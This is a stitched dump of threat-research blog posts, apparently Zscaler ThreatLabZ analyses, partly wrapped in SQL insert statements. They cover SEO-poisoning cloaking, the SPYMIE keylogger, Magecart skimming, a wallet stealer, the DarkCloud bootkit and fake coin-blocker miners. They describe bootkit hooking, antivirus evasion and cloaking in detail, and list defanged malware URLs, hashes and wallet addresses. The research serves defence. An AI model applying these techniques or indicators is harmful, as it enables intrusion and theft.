best2017games[.]com/bestgames/playtime/6a6d637637c06de629eb725d6c5c34e1/index.php?country_code=US&p1=http%3A%2F%2Fadsfxs.pro%2Fclick%2F05e45367-502f-4558-8e24-9235a5169358%3Fclickid%3DVjN8MTQyNjk4NDh8MTE0NTYyNXwxNTQ2MzZ8MTUyMTA2NzI3M3wyN2RkMDE5MS0xMThjLTRhNWItYjJiYy1mYWI0Nzk2ZTRjMzJ8NzEuMTk3LjIzMS45NXwzfDIwZTdkNzQ3Mzk3MmU5MTllZDQ2NDY0NTI3ZmE0OTcz%26zoneid%3D14269848    The multiple redirect model provides a perfect platform for a MaaS (Malware-as-a-Service) infrastructure, as it shields the final landing page from automated security crawlers.    Cloaking technique    The attackers are leveraging cloaking techniques whereby the end user is served different content depending on the HTTP headers involved in the web request. We noticed three distinct responses in some of the recent campaigns:         	Crawler view: The SEO URL will return a web response that is more catered towards poisoning the search engine results for the relevant search term. This will make the URL appear higher in the search result.  	Browser or user view: The SEO URL in this case will lead the user through a series of redirects before a final landing page, dependent upon the campaign.      The attacker distinguishes between user view and crawler view by inspecting the user-agent HTTP header of the request. If the user-agent string belongs to a well-known web browser, then user view content is served.         	Referer view: The SEO URL in this case will serve different content to the end user, depending on the URL set in the referer HTTP header.      Without cloaking    Without the use of cloaking, the content fetched by the search engine crawler “crawler view” as well as the direct user “direct view” will be identical. However, the SEO page will have scripts to detect whether it is an actual user loading the content in a web browser, in which case the user will be redirected to the final landing page containing the malicious content.    Here is an example of an SEO campaign where cloaking is not being used:    URL:  tucuerposiente[.]cl/forum/070sxjj.php?bbhb=excel-vba-cells-function    The crawler view and direct view for this SEO URL returns identical content. The SEO page in this case will redirect to a final landing page based on the user’s action, such as mouse movement or rendering of the page in the web browser. The crawler will not see the landing page redirect, as there is usually no user interaction or browser rendering involved.    Below is a view of what happens when a user browses an SEO-poisoned URL that is not leveraging cloaking techniques. The user will see a webpage as well as a busy icon on the browser tab indicating additional background activity. This activity is leading the user to the final landing page in the background as shown in this screen capture from Fiddler (a free web request debugging tool).        Figure 5: An SEO poisoned URL without cloaking leads user to landing page    The attacker is leveraging specially crafted CSS (Cascading Style Sheet) to perform a redirect from the user’s browser. In CSS, the URL property can be used to set the background. The figure below shows the typical usage of the URL property (taken from w3schools.com).            Figure 6: URL property    But, if you don’t give any parameter to the URL property, like url() instead of url(“URL”),  it will load the parent page again. During the second loading, however, the referer HTTP header is set to the parent URL itself. This is the reason there are two requests to the same URL in Fiddler. It is important to note that the malicious content will be served on the second request, in which the referer HTTP header is set to the expected URL.    The figure below shows the CSS code snippet used in the SEO page. The line “background-image: url()” will cause the page to reload.        Figure 7: CSS code snippet in the SEO page    The second request will load the malicious code, as shown in the image below.        Figure 8: Malicious code    SEO URL generation    Let’s take a look at a typical SEO URL structure seen in SEO poisoning campaigns:    SEO URL:  sbtechsiteleri[.]com/docs/bmfns7.php?gneo=access-vba-form-load    We can divide this URL into several parts:      	Host:                           www.sbtechsiteleri[.]com  	URI path:                    docs  	PHP page file: bmfns7.php  	Parameter:                 gneo  	Search keywords:      access-vba-form-load      The campaign uses different parameters to generate URLs. We have found hundreds of unique parameters; jtjd and wanh are two examples of parameters shown in the screenshot below.    From the search result in the screenshot, we can reasonably guess there are hundreds of millions of SEO URLs generated for these two parameters.         Figure 9: URLs generated     SEO web page generation    Although we don’t have access to the backend code used to generate the SEO webpages, we can draw some insights into the generation process based on our analysis of several pages involved in this activity:      	Pick up the keywords from the “search keywords”; search in search engine  	Collect the responses that contain the keywords   	Generate a final response containing specific strings from the collected responses      The Google cache of the webpage www.sbtechsiteleri[.]com/docs/bmfns7.php?gneo=access-vba-form-load:         Figure 10: Example of Google cache     The first sentence, “I am fairly new to Access,” can be found in several URLs. The second sentence, “Programming Microsoft Access with VBA can be a lot easier if you know the keyboard shortcuts for the most common commands and tasks and the” is from this site:        Figure 11: Example of site found     Following that sentence, you can see, “If you want to set the RecordSource of another form, you must ensure the other form is open first,” which is from this website:        Figure 12: Example of sentence found at site    All three of the above examples are for the keyword “access.”    Conclusion    SEO URLs redirect users to different targets. We saw two modes of operation in the pages that we analyzed:           	The users go through a series of redirects to reach the final landing page.  	The users are redirected to a MaaS (Malware-as-a-Service) platform which starts another redirection chain leading to final landing page.           Here are the top web categories to which the final landing page sites belonged:    1. Adult and pornographic websites    2. Internet services sites; in this case, the SEO campaign\'s purpose is advertising    3. Politics and religion, an example of which is shown below        4. Exploit servers leading to adware/malware payloads    On an average, we see over 3,000 new and unique SEO poisoned URLs every day. ThreatLabZ is actively tracking this threat and will continue to ensure coverage for Zscaler customers.

INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (18, 'Why you shouldn\'t trust \"safe\" spying apps!', 'Shivang Desai', 'October 03, 2018', 'During a recent malware hunt, the ZscalerTM ThreatLabZ research team came across a suspicious Android app on Google Play, the official Google app store, named SPYMIE. SPYMIE portrays itself as an Android-based key logger designed for parents to track the cell phone activities of their children. Given the popularity of such apps, it has become common practice for app creators to promote spying capabilities as parental control features. However, SPYMIE packs a little something extra with the parental controls. \r\n\r\nBasically, SPYMIE is an Android-based keylogger that has ability to hide itself and start recording everything the user tries to access. Ideally, keystroke logging is best achieved with keyboard-based apps, but this app uses Android\'s Accessibility Services to perform its functions. The app author also has included their email address in the code of the app, which allows them to receive all the information that the app is collecting, making those using the app vulnerable to having their personal information stolen. \r\n\r\nBefore the app was removed from Google Play, its description was as follows: “SPYMIE: Key logger is specially designed for parents to track the cell phones of your children. It will also help you when someone friends ask you for your phone for ten minutes but you don’t trust on it. So what you have to do you only have to on the SPYMIE: Key Logger. So whenever the friends return phone to you, you can check all the activities done by your friend. It records all the activities that are done on your phone. All activates are send to your mobile phone via email. \r\n\r\n\"For parents what they have to do, you just install the app in your children phone. Hide the icon. Later on you have check all the activities done by your children in the whole day.\"\r\n\r\nZscaler notified Google about the presence of this app and it was immediately removed from Google Play.\r\n\r\n \r\n\r\nApp Details\r\n\r\nName : SPYMIE: Key Logger\r\nPackage Name : com.ant.spymie.keylogger\r\nHash : 8e32ce220e39ba392c9e15671a32854b\r\nSize : 5.5M\r\nInstalls : 10,000+\r\n\r\n \r\n\r\nTechnical Details  \r\n\r\nAs soon as the app is installed, it splashes basic setup activities asking the user for email ID, as shown in screenshot below. \r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig. 1: SPYMIE initial activities\r\n		\r\n	\r\n\r\n\r\n \r\n\r\nOnce the introduction is complete, the app asks for runtime permission for managing outgoing calls. The reason for asking this permission is related to the app\'s hiding functionality. As shown in screenshot below, if the user enables the hiding feature, the app then asks for a secret PIN to open the app. The user can then open the app by firing up the phone dialer and entering the PIN. This is the main reason for asking permission related to phone calls.\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig. 2: Hiding functionality \r\n		\r\n	\r\n\r\n\r\n \r\n\r\nAfter further analysis, we found that the app contains a default PIN as well. Dialing **00## would open this keylogger app. The screenshot below shows the code snippet for this functionality. \r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig. 3: Default hard-coded PIN\r\n		\r\n	\r\n\r\n\r\n \r\n\r\nOnce the basic setup is done, one can turn on the spying feature. For enabling spying on a user\'s activities, this app uses Accessibility Services. This feature was designed to assist users with disabilities in using Android devices and apps. The below screenshot displays functionality in action: \r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig. 4: Enabling Accessibility Services\r\n		\r\n	\r\n\r\n\r\n \r\n\r\nOnce Accessibility Services is enabled, the app starts logging every activity performed by the user/victim. The snapshot below shows the code responsible for logging user actions along with keystrokes and storing it in a file named SpyLogger.xml. \r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig. 5: Storing user/victim\'s activities \r\n		\r\n	\r\n\r\n\r\n \r\n\r\nIn order to see the functionality in action, we tried running the app in a controlled environment. At first, we opened Gmail and tried composing a sample email. As shown in the screenshot below, almost every activity, from opening the Gmail app (left side) to composing the body of the email, was logged (right side). \r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig. 6: Gmail logging\r\n		\r\n	\r\n\r\n\r\n \r\n\r\n  In another test, we fired up Paytm and tried logging in. The right side of the screenshot below shows how every action was logged. \r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig. 7: Paytm login\r\n		\r\n	\r\n\r\n\r\n \r\n\r\nThe above screenshots display the logs visible in Android\'s logcat command, but behind the scenes, all this data is being written in a file named SpyLogger.xml.  \r\n\r\nLooking from another perspective, the app has a serious vulnerability which, according to OWASP, can be categorized into Insecure Data Storage. Any random app with READ_LOGS permission can read logs presented by Android. In this scenario, all sensitive data is being written to log entries and every piece of sensitive data is at risk. \r\n\r\nAdditionally, this keylogger app can send logged/stolen data to the email ID input by the user during setup, but we found a code snippet that was designed to send this data to another hard-coded email ID as well. The screenshot below shows both the code snippets. The first one is the ideal scenario, in which email is sent to the provided email ID, and the second box shows the app\'s functionality, in which a timer task is run to send email to the hard-coded email ID every 60 seconds. \r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig. 8: Sending stolen data to different email IDs\r\n		\r\n	\r\n\r\n\r\n \r\n\r\nDuring our analysis, we did not find any calls made to the second code snippet, where email is sent to the hard-coded email ID, and we believe there are two possible explanations. It is possible that the app\'s author added this functionality while testing and forgot to remove the dead code. This seems unlikely, because the code snippet to send email to the hard-coded email ID is well designed and placed as a timer task to send email every 60 seconds. The second possibility could be related to the app being \"under-construction.\" This app might still be in development and any calls related to this function may be added in future updates. \r\n\r\nConclusion \r\n\r\nWe believe there are two likely scenarios in which key logging apps, like SPYMIE, may be used.\r\n\r\n1. Parents installing spying apps on their children\'s devices\r\n    - Parents can install such apps in order to track their children\'s online activities\r\n2. Users willingly install such an app to steal someone else\'s data.\r\n    - Any user can install such apps on their Android devices and might offer their phone to others for use. When a victim enters his/her personal details, it will be logged. User can view this information at a later time.\r\n\r\nIt is always advisable to stay away from spying apps, because a typical user can never be sure of what exactly is happening under the hood. Be cautious if using mobile devices other than your own. Never perform critical actions or enter personal information on borrowed or unknown devices. Zscaler users are safe from such type of threats. ZscalerTM Sandbox detected the app accurately as shown in screenshot below: \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Fig. 9: Zscaler Cloud Sandbox detection', '', 'http://www.zscaler.com/blogs/research/why-you-shouldnt-trust-safe-spying-apps');

Magecart is a notorious hacker group that has been responsible for large attacks on the e-commerce sites of well-known brands, and we have continued to see its activity during this past month. In this blog, we will examine this campaign’s recent activity and its methods for skimming credit and debit card information for financial gain.    The e-commerce sites targeted by Magecart are being compromised and injected with malicious, obfuscated JavaScript, which, in turn, tries to tap into purchase transactions. Injected script typically adds a form to the payment page at runtime using Document Object Model (DOM) properties. This form captures information such as the site’s domain, credit card details, and the user’s personal information, and then makes a POST request, sending all stolen information to remote site.    Magecart compromise sample    As shown in the screenshot below, the attacker compromises the site and injects a script tag in order to dynamically load a highly obfuscated JavaScript code hosted remotely.        Figure 1: Magecart compromised site    The obfuscated JavaScript code as well as the deobfuscated version of the same can be seen below. This is a common technique leveraged by the attackers to evade detection by security crawlers.    Figure 2: Injected JavaScript code for stealing information    As shown in the image below, this script tries to steal financial and personal information from the form input elements of the target site, and sends the collected information back to the attacker-controlled site.        Figure 3: POST request with stolen information    The domain used by the attacker to host malicious scripts and receive stolen information was registered in early September 2018. This newly registered domain is part of a trend we are seeing that minimizes the attacker\'s chances of getting blocked based on reputation engines, as the site is too new to have a low rating. Fun fact: the attacker also listed this domain for sale.        Figure 4: Attacker’s domain registration    Below are hits we have seen from MageCart campaign in past month.              Figure 5: Campaign activity in past month    Although this campaign is not new, we continue to see newer domains being leveraged and additional e-commerce sites being impacted on a regular basis.

INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (20, 'The latest cloud hosting service to serve malware', 'Dhanalakshmi', 'September 19, 2018', 'In recent years, there have been many studies related to compromised cloud hosting services.    It has been reported that these services are increasingly being abused by hackers and malware authors for their malicious online activities. The services enable bad actors to open an inexpensive hosting account, allowing them to hide malicious content in the cloud-based domains of well-known brands, mixing the bad content among the good to prevent the malware from being blacklisted.    In its research, the Zscaler ThreatLabZ team discovered that a popular managed cloud hosting service provider called “Cogeco Peer 1” has been serving phishing attacks and other malware in the wild as far back as February 2018. One of the domains hosted by this service provider, called “flexsel[.]ca,” is distributing a malicious document that installs a crypto-wallet stealer on victims’ machines. Other Cogeco Peer 1 domains are serving various phishing attacks using fake logins for Microsoft, DocuSign, and banking sites.     The below image of hosting IP [64[.]34[.]67[.]205] information shows some of the domains affected by this campaign.        Figure 1: Domains affected by the campaign    The Whois information related to the hosting IP address is as follows:        Figure 2: Whois information on hosting IP address    In this blog, we will provide a technical analysis of two types of attacks served by this campaign in August 2018.    1. Multi crypto-wallet stealer payload delivered through malicious document    2. Microsoft and DocuSign phishing attack    Multi crypto-wallet stealer payload delivered through malicious document:    The crypto-wallet stealers are not new to the information security industry, but we have seen a dramatic increase in their use recently. We found that the domain “http[:]//flexsell[.]ca/,” which is hosted on 64[.]34[.]67[.]205, distributed a malicious document to users during the second week of August 2018. This malicious document downloads and installs a payload with the ability to steal stored crypto-wallets from user machines.    Download link: flexsel[.]ca/myresume/resume_ahmadhammouz[.]doc    Zscaler spotted and blocked this threat over the past two weeks, as shown below:        Figure 3: Unique instances of the malicious document and the final payload downloads as seen by Zscaler    Technical details:    The document, called “resume_ahmadhammouz[.]doc,” has a malicious macro which is executed when the document is opened. It further downloads and executes a crypto-wallet stealer payload on the victim’s machine. This payload tries to steal stored cryptocurrency wallet information, targeting Bitcoin, Electrum, and Monero cryptocurrency wallets.    The obfuscated malicious VB code in the document file is shown below. It initiates an HTTP request to the hardcoded download path of the wallet stealer binary without user intervention.        Figure 4: Obfuscated malicious VB code in the document file    The below Wireshark image shows the payload download on the victim’s machine.         Figure 5: Wireshark screen capture showing download of malicious payload    This malware variant is custom packed. It decrypts and loads an actual wallet stealer file (Borland Delphi compiled) on runtime. Upon execution, the malware collects basic system information, including machine ID, EXE_PATH, Windows, computer (username), screen, layouts, local time, and CPU model. The collected information is sent to a C&C server, which is hardcoded in the file as shown below.        Figure 6: Calls to C&C server    The encrypted POST communication to the C&C server is shown below.             Figure 7: Post-infection communication to the C&C server    The wallet stealer malware searches for the default location of the digital wallet stored on the infected machine, along with browser cookies and login details of popular applications like Pidgin, WinSCP, and Psi+. The following digital wallet files are hunted on a victim’s machine.        Figure 8: Digital wallet files types searched for by malware    The information stored in digital wallet data files includes:      	mbhd.yaml – Contains general preferences and configuration information (theme, exchange, etc.)  	mbhd.checkpoints – A Bitcoin checkpoints file, used when syncing your wallet  	mbhd.spvchain – A Bitcoin block store, used when syncing your wallet      Microsoft and DocuSign Phishing attack:    After exploit kits, phishing is the one of the most significant threats to individuals and organizations today. The dynamic nature of the domains that serve phishing pages, along with the easy hosting features provided by cloud services, magnifies these types of internet attacks.    The Microsoft and DocuSign phishing pages seen in the wild on August 29, 2018, are shown below.        Figure 9: Microsoft and DocuSign phishing pages seen on August 29    The fake Microsoft phishing page image is shown below.        Figure 10: Fake Microsoft phishing page    The DocuSign phishing attack is a tactic used to persuade computer users to enter their account credentials on a fake DocuSign login page. These stolen credentials are used by the attacker to carry out various malicious activities; as a result, the victim’s machine can be infected by other malware.    The following image shows the fake DocuSign login page:        Figure 11: Fake DocuSign login page    Conclusion:    This report covers just one of the active and compromised cloud repositories and the illicit online activities built around it, though these types of attacks have become increasingly common. As individuals and organizations gravitate towards cloud computing, attackers are motivated to host malicious content in the cloud. It is extremely important for cloud hosting service providers to be vigilant in identifying and mitigating attacks on their repositories.

INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (21, 'DarkCloud Bootkit', 'Nirmal Singh', 'September 13, 2018', 'In an earlier blog about crypto-malware, we described different techniques used by cybercriminals, such as cryptomining and wallet stealing. In this blog, we will provide a technical analysis of yet another type of cryptominer malware using a bootkit and other kernel-level shellcode for persistence.    Installation     The installer is responsible for infecting a system’s master boot record (MBR), which identifies how and where the operating system is located. It opens the boot drive (figure 1) and reads the first 0x400 bytes, which is MBR data.        Figure 1: Opens boot drive    It checks for GUID Partition Table (GPT) partition flag and doesn’t infect GPT disks (see figure 2).        Figure 2: Checking GPT Disk    It moves the clean MBR code from sector 0 to sector 1 (figure 3) and inserts malware code in sector 0 (figure 4). Malicious code is written from sector 2-53.        Figure 3: Clean MBR code        Figure 4: Infected MBR code    Analysis for malicious MBR    Malicious MBR code hooks 15h interrupt (figure 5). It specifically hooks for service 0xE820 of interrupt (int) 15h (figure 6). This service is used to query system memory.        Figure 5: Interrupt 15h hooking        Figure 6: Service 0xE820    After hooking, it loads the original MBR code to resume the booting process. During execution, when bootloader calls int 15h, malware code receives the control and verifies the AddressRangeDescriptor Type, BaseAddrLow, BaseAddrHigh, and LengthLow. After verification, it modifies the LengthLow value to hide the malicious MBR code (figure 7).        Figure 7: Hiding malware code    Loading in kernel    The malware uses different methods, depending on the Windows version, for loading into the kernel. Figure 8 lists the different ways for XP and 7 versions of Windows.        Figure 8: Flow of execution    In Windows XP, it patches code in BlLoadDeviceDriver function in osloader.exe. It also patches code in BlLoadDeviceDriver after it calls to function BlLoadImageEx. The BlLoadImageEx function maps all device drivers in memory. Ntoskrnl.exe will load and execute these drivers (IopInitializeBootDrivers->IopInitializeBuiltinDriver) (figure 9).            Figure 9: Comparison of patched and unpatched code of BlLoadDeviceDriver function    When osloader.exe tries to load the ftdisk.sys driver, it injects malicious shell code in the resource section and a modified entry point to malicious shellcode.        Figure 10: Searching for resource section and comparing section size for shellcode        Figure 11: Malware shellcode in the ftdisk.sys resource section    In Windows 7, the malware searches the address of the OslArchTransferToKernel function from OslpMain (entry point) in winload.exe. OslArchTransferToKernel transfers control to NTOSKRNL.EXE. The malware patches this function (figure 12) to get the loading address of NTOSKRNL.EXE.        Figure 12: Patched OslArchTransferToKernel function code    After getting control to NTOSKRNL.EXE, the malware patches ZwCreateSection API (figure 13).        Figure 13: Patched ZwCreateSection API    Analysis of kernel shellcode1:    This shellcode is responsible for hiding the malicious MBR code and preventing AV products from loading. Shellcode first retrieves the base address of ntoskrnl.exe and gets the address of different APIs. An undocumented field (at offset 0x14) of DRIVE_OBJECT is used to retrieve the  MODULE_ENTRY pointer and enumerated to get base address of ntoskrnl.exe (see figure14).        Figure 14: Searching for base address of ntoskrnl.exe    API names are stored as 32-bit hash values in the code. The ROR13 calculation method is used to generate hash values for each API name (figure 15).        Figure 15: API hash calculation    AntiAV techniques    To stop AV systems from loading, the malware creates notification objects similar to the device names used in 360 AV product device drivers.        Figure 16: Holding AV-related device names    Hiding Malicious MBR code    Different low-level drivers are patched to hide malicious MBR code. In Windows XP, the IdePortStartIo function of atapi.sys is hooked (figure 17).        Figure 17: Hooking IdePortStartIo function of atapi.sys    The hooking function specifically looks for read and write requests (figure 18). If there is a read request for sector 0-61, it hooks CompletionRoutine of IRP sent to atapiDeviceObject and serves a clean MBR code.        Figure 18: Checking SCSI command descriptor block (CDB) for read and write request    If there is a write request for sector 0-61, the malware modifies the operation code in command descriptor block (CDB) and SrbFlags flags of SCSI_REQUEST_BLOCK object. The operation code is changed to 0x28 (SCSIOP_READ) and the SrbFlags are set to SRB_FLAGS_DATA_IN which indicates that it is a read operation. So, the write request is simply converted to a read request and passed to the driver. Figure 19 shows the execution flow of the MBR hiding function.        Figure 19: IdePortStartIo hook function execution flow    Analysis of kernel shellcode 2:    This shellcode executes as a system thread but terminates itself if the system is booting in safe mode. It searches for the explorer.exe process and injects usermode shellcode (referred as ushellcode1 afterword). Ushellcode1 is compressed using LZ compression with COMPRESSION_ENGINE_MAXIMUM flag (figure 20).        Figure 20: First usermode shellcode    Ushellcode1 is injected in explorer.exe with thread data, which is shared memory between the kernel mode thread and ushellcode1 thread, as shown in figure 21. The remote APC thread technique, KeInitializeApc, and KeInsertQueueApc kernel APIs are used to achieve this. It also executes downloaded kernel shellcode by the ushellcode1.        Figure 21: Thread data    In the second step, it searches for processes related to different security software solutions (table 1) and terminates the process.

The config file is encrypted (using simple XOR) and saved in C:\\Windows\\Temp\\ntuser.dat file.        Figure 22: Downloading config file    The config file contains different URL addresses, used to download further shellcodes and config files. Content of the config file is shown in figure 23. For the IPs mentioned under the main section, it appends the “TestMsg.tmp” string at the end URL to generate a full URL, which serves as shellcode. Similarly, for all the URLs mentioned under section [update] as seen below, it appends string “address.txt” so these URLs are used to download the updated config file.        Figure 23: Config file content    The downloaded shellcode continues to download the final payload using information from the new config file (figure 24). The payload is saved in the %SYSTEMROOT%\\\\TEMP folder with the name conhost.exe (figure 25) and executed with the “-C create -r” parameter.        Figure 24: new config file contents        Figure 25: Download of final payload    Analysis of payload    This payload works as a downloader. During our analysis, we found it downloading a cryptomining tool. It registers itself as a Windows service with name “Windows Audio Control.” It supports different command line options (figure 26), including the main ones: Create, delete, start, and stop services.        Figure 26: Different command line options.    Upon executing without any command, it first downloads xpxmr.dat file that contains a list of C&C IP addresses and URLs.

As more and more users become aware of this threat and try to take measures to protect themselves, cybercriminals are attempting to cash on that fear by serving crypto-miner malware from a website claiming to offer a coinminer blocker. Although the website looks unprofessional and would appear suspicious to most, there are plenty of non-tech savvy users who may fall for it.        Figure 1. Source website    We have observed two variants of this malware strain being served from the above mentioned website as well as coin-blocker[.]com. In both cases malware operator is using malicious miner code written by another author for his financial gains and in the process also getting duped himself/herself.         CryptoMiner Variant #1    MD5s: 927adcebfa52b3551bdd008b42033a6e and c777e949686f49cc0a03d0d374c5e68a    The first malware variant was getting downloaded with file names like \'cr_blocker_v12.exe\', \'apollo.exe\' and was making extensive use of batch files. First it will drop and execute a batch file , which in turn, runs a PowerShell command (a slightly modified version of the PowerShell script from http://moneroocean[.]stream) to download and execute a batch script (again a copy of moneroocean\'s xmrig_setup.bat) from same website.  The purpose of final batch script is to download, setup and run monero miner on infected system.                 Figure 2. Execution flow and Batch file executed by malware    The above script is sourced from a script that is published on MoneroOcean\'s GitHub account with two minor modifications. The malware author has modified the DownloadFile URL to point to a copy of official miner batch file that is hosted on the malware author\'s site. The second and obvious modification is the wallet address change, where the attacker is collecting the revenue from this fradulent mining campaign. This address has not earned much yet (as of August 16, 2018, just 1.298239 XMR has been paid), but this campaign is just getting started, so it is early to draw any conclusions.         CryptoMiner Variant #2    MD5s: d3fa184981b21e46f81da37f7c2cf41e    The second malware variant was seen being downloaded with filename start_me_now.exe which will further download another file named start_me.exe from same domain and executes that file. The downloaded file is an SFX archive containing multiple files, including both xmr-stak and xmrig miner with same configuration.        Image: Cryptominer SFX variant execution flow diagram    The malware operator has used a version of Playerz Multi Hidden Cryptocurrency Miner from multicryptominer[.]com with the addition of silent.exe containing an embedded copy of xmrig miner. Silent.exe will run xmrig miner by injecting it into a process such as notepad.exe.        Figure 3. SFX Script from start_me.exe    Batch files are just one-line scripts in this case as seen below; run.bat will run c:\\ProgramData\\playersclub\\player.exe and share.bat will open xmrminingpro[.]com/share.html in an attempt to convince the user to share this website on social media sites - Twitter, Facebook and Google Plus - resulting in further infections.

Figure 8. Autohotkey script from systemSpawn.exe    It will run player.exe using the following switches to gain escalated privileges: -s (run the process in the system account), -x (display the UI on the Winlogon secure desktop), -d (don\'t wait for process to terminate [non-interactive]), -i (run the program so that it interacts with the desktop of the specified session on the specified system. If no session is specified, the process runs in the console session).         player.exe    Player.exe is the main process responsible for managing the xmr-stak.exe process. It will do all of the things mentioned by the malware author on its website, such as: run when the computer is idle; check if video or audio is being played; automatically download and, if needed, update miner software; kill processes mentioned in all ProcessesList.txt, and more.    Ironically, the Playerz Multi Hidden Cryptocurrency Miner author has provided a wallet address for donations to help fund the development of this malware.        Figure 9. Donation address mentioned on the website    But that was not enough, the author also added a backdoor functionality to mine cryptocurrency for his own address in the mutlicryptominer binary. It will check the modified timestamp of player.txt, and if that file is more than five days old, it will get latest config from multicryptominer[.]com/pool2.xml.

Parsing configuration from C&C    Response from the C&C server:      Figure 11. Configuration received from server    It will then calculate time for running the original author\'s and the second level malware operator\'s miner on the infected system:        Figure 12. Calculation time distribution for author\'s and customer\'s address mining    In case the server did not respond with the proper configuration, or player.txt is not more than five days old, it will run the second level malware operator\'s miner for 105 minutes and author’s for 15 minutes; otherwise, it will distribute time among mining addresses depending on a value received from the server. At the time of analysis, the server was sending the maximum possible value of nine, which means it is splitting mining time between author and customer in a 3-to-1 ratio (90 minutes for author and 30 minutes for customer).    After it is done downloading the backdoor configuration and calculating time, it will start timers for various activities:        Figure 13. Timers for running and stopping the mining process         When conditions are met for running the miner—for example, when the system is idle and no video or audio is playing—it will run the miner using runProcesses.exe. This will also ensure that the end user will not notice any obvious system slow downs from miner operation.        Figure 14. Run miner processes using runProcesses.exe    It also starts a timer with callback to kill the process after timeout.         runProcesses.exe    This will try to detect CPU and graphics to run miner with optimal settings and, in case no configuration is downloaded from C&C, it also includes hardcoded wallet addresses for mining.        Figure 15. Hardcoded addresses used if configuration is not received from server         Conclusion    There is a rising trend of new cryptominer malware families as well as existing malware families adding cryptominnig support as highlighted in our previous writeup here. AntiCoinMiner malware operator is leveraging the tried and tested scareware tactics theme very similar to FakeAV malware families, where it gives a false sense of security to the end user while exploiting their machine for financial gains. The malware operator is using an off-the-shelf cryptominer malware for this campaign; however the original cryptominer malware author has a backdoor functionality embedded in the code which deceives the second level malware operator by stealing large portion of CPU cycles from the infected machines to mine coins for the original author.    Zscaler ThreatLabZ is actively monitoring for threats like these and will continue to ensure coverage for Zscaler customers.             IOCs    MD5s:    927adcebfa52b3551bdd008b42033a6e  d3fa184981b21e46f81da37f7c2cf41e  c777e949686f49cc0a03d0d374c5e68a  Ecd13814885f698d58b41511791339b6  642cccf03f9493b3d91d84e1b0e55e9c  Da8d0c73863afe801bb8937c4445f5f9  D3fa184981b21e46f81da37f7c2cf41e  E6569c2c9bceb6a5331d39a897e99152  06ded4e24118a4baccfd2f93fffe3506  927adcebfa52b3551bdd008b42033a6e  f8df9d2adf5b92dc4dd419098d444bde  B0cec3e582a03c978eaff9a8d01f3c31  D204728ac2e98ac380953deb72d3ca57  c842a49268b52892268e3ff03205b2de  95ea8c948a5254a3b24cbbf3edec1a1a    URLs:    www.xmrminingpro[.]com/start_me_now.exe  xmrminingpro[.]com/cr_blocker_v12.exe  xmrminingpro.com/Crypto_Blocker_.BAT.exe  coin-blocker[.]com/Coin_Blocker_v1.55.exe  xmrminingpro[.]com/Apollo.exe  coin-blocker[.]com/Coin_Blocker_v1.5.exe  coin-blocker[.]com/old/apollo_stream.exe  coin-blocker[.]com/apollo/apollo_x86.exe    Wallet Addresses:    From Samples:    4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQsjqdY9cck94oTET4i  48LYTsUuFis3eheaGJSVC1b4DiftHw8249KCELDPGLU7Ke7GddfV7vM8qmuoW3x3qy8hPXiEknM2jixquq4qbHYHHmWut4J  4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQrzvo2Dv3ebJHC95XG  4BEqL8aYcuydaT26Rm9BBDgx5MAPeMSeJGgMd8RJDQKaPZEVySfAaTU8bVMsp2uykJZJ1aJDtyLRHREUBe1XXjfUAty7XJy  4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQrzvo2Dv3ebJHC95XG  4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQmRkHZngZS7So7FipR    Author\'s wallet addresses:    Hardcoded in sample: 472dyZhom95Higc85N5E1LbiY3kgbQvapcZ1DosRfjKX4EAvK3ZrdvuLxLMe4vTFbEUAhECZoDZHyGMdFJktrZZyNA3v1Wr  Received from c&c: 48LYTsUuFis3eheaGJSVC1b4DiftHw8249KCELDPGLU7Ke7GddfV7vM8qmuoW3x3qy8hPXiEknM2jixquq4qbHYHHmWut4J  Mentioned for Donation: 48YAdSiCmzSPXxbrqjhnkVNLfFwcX6uJvV6wVGxNdDZ1Fww43c6zdjo1HePWZY6KXp78q8kv5rcqFYM76uSpPv8u4E2pnuq', 'Malware', 'https://www.zscaler.com/blogs/research/anti-coinminer-mining-campaign');

Exploit kits (EKs) are rapidly deployable software packages designed to leverage vulnerabilities in web browsers and deliver a malicious payload to a victim’s computer. Authors of EKs offer their services for a fee, distributing malware for other malicious actors. Though it\'s been declining, there is still plenty of EK activity, and EK operators continue to adopt new techniques for monetizing infected machines.    Due to the increase in popularity and value of cryptocurrency, we are seeing EK operators shifting their focus from ransomware to cryptominers, with the end payload generating revenue in multiple instances. All the exploit kits mentioned in this roundup were seen infecting users with cryptominer malware. We have also seen an increased use of malvertising campaigns to direct users to exploit kits. What follows are highlights from the EK activity we observed during the last quarter.    RIG Exploit Kit    RIG EK has been active for some time now. Though there are many other EKs that enter and exit the threat landscape, RIG has been persistently on the scene and adopting changes over time. Recent changes were the inclusion of CVE-2018-8174 and the use of cryptominer payloads to monetize infected resources. The hits that we saw were mainly from malvertising campaigns running on pirated movie streaming or adult websites.    The RIG EK activity hits are shown below.        Figure 1: RIG EK hits from May 1, 2018, to August 5, 2018    The geographical distribution of the hits 